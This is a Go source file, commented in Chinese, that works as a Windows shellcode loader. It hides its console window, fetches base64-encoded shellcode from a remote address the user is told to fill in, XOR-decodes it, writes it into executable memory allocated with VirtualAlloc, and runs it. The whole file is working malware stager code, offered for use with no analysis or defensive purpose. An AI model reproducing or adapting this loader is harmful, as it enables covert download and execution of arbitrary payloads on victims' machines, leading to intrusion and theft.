package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"syscall"
	"unsafe"

	"github.com/lxn/win"
	"golang.org/x/sys/windows"
)

func main() {
	// 通过 base64 和 XOR 解密 shellcode 内容
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	//time.Sleep(20 * time.Second)
	resp, err := http.Get("http:/xx.xxx.xxx")  //填入远程shellcode地址
	if err != nil {
		fmt.Println("Error getting remote connection:", err)
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading from remote connection:", err)
		return
	}

	encryptedShellcodeStr := string(body)
	decodedShellcode, err := base64.StdEncoding.DecodeString(encryptedShellcodeStr)
	if err != nil {
		fmt.Println("Error decoding shellcode:", err)
		return
	}
	for i := 0; i < len(decodedShellcode); i++ {
		decodedShellcode[i] ^= 0x77
	}

	// 获取 kernel32.dll 中的 VirtualAlloc 函数
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	// 分配内存并写入 shellcode 内容
	allocSize := uintptr(len(decodedShellcode))
	mem, _, _ := VirtualAlloc.Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		panic("VirtualAlloc failed")
	}
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, decodedShellcode)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)
}
